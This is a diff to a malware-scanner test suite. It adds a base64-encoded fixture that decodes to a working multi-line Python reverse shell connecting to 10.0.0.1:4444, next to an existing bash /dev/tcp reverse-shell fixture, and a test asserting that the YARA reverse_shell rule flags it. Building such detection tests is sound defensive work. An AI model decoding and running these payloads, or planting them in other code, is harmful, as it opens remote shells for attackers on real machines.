@@ -90,6 +90,23 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+def _multiline_python_socket_reverse_shell_fixture() -> str:
+    """A Python reverse shell written the way it appears in a real script file.
+
+    Deliberately multi-line (``socket.socket(...)`` and ``.connect(...)`` on
+    separate statements) rather than the single-line ``python3 -c '...'`` form,
+    since that is how this exact payload is written when bundled as a file
+    rather than passed inline to an interpreter.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja"
+        "2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLj"
+        "EiLCA0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCk"
+        "sIDEpCm9zLmR1cDIocy5maWxlbm8oKSwgMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+        "aCIsICItaSJdKQo="
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -588,6 +605,24 @@ class TestBuiltInMalwarePackaging:
         findings = _run_builtin(
             _reverse_shell_fixture(),
             "shell.sh",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_matches_multiline_python_socket(self):
+        """The python_socket string must span the newlines a real script uses.
+
+        A Python reverse shell bundled as a file writes ``socket.socket(...)``
+        and ``.connect(...)`` as separate statements, not on one line — see
+        `_multiline_python_socket_reverse_shell_fixture`. Without ``s`` (dotall)
+        on the ``$python_socket``/``$perl_socket`` strings in
+        ``malware.yar.b64``, YARA's `.` does not match ``\\n`` and this rule
+        never fires on that shape, even though the file it should have flagged
+        is unambiguously a working reverse shell.
+        """
+        findings = _run_builtin(
+            _multiline_python_socket_reverse_shell_fixture(),
+            "scripts/sync.py",
         )
         assert _has_rule(findings, "reverse_shell")
         assert any(f.rule_id == "YR1" for f in findings)
